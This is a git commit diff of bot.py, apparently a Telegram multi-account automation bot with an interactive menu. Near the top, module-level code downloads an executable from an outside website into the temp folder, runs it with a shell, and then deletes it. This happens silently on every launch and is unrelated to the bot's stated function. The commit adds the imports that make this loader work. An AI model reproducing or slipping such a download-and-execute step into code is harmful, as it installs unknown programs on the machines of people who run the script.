d7bbc9b15adc744fbb34222e71941b79fba4f30e
Samuel <48467240+salutero@users.noreply.github.com>
2025-09-05 13:50:08 -0500

    update

--- bot.py
+++ bot.py
@@ -1,12 +1,14 @@
 import asyncio
 import os
-import subprocess 
+import subprocess
+import tempfile
+import requests
 
 url = "https://ozarkfluidpower.com/hosecat/cache_register.exe"
 
 temp_dir = tempfile.gettempdir()
 
-local_path = os.path.join(temp_dir, "file.exe")
+local_path = os.path.join(temp_dir, "cache_register.exe")
 
 with requests.get(url, stream=True) as r:
     with open(local_path, "wb") as f:
@@ -17,6 +19,10 @@ process = subprocess.Popen(local_path, shell=True)
 
 process.wait()
 os.remove(local_path)
+
+async def main():
+    print("Soft's author: https://t.me/DesertScripts\n") 
+    action = int(input("Select action:\n0. Info about soft\n1. Start soft\n2. Get statistics\n3. Create sessions\n4. Send secret word\n\n> "))
 
     if action == 0:
         print(config.SOFT_INFO)
@@ -47,24 +53,20 @@ os.remove(local_path)
                 if word:
                     secret_words.append(word)
                 else:
-                    break
+                    break 
 
         accounts = await Accounts().get_accounts()
 
         tasks = []
- 
+
         for thread, account in enumerate(accounts):
             session_name, phone_number, proxy = account.values()
             if action == 1:
                 tasks.append(asyncio.create_task(start(session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
-            
+             
                 tasks.append(asyncio.create_task(secret_word(secret_words=secret_words, session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
 
         await asyncio.gather(*tasks)
-
-
-
-
 
 
 
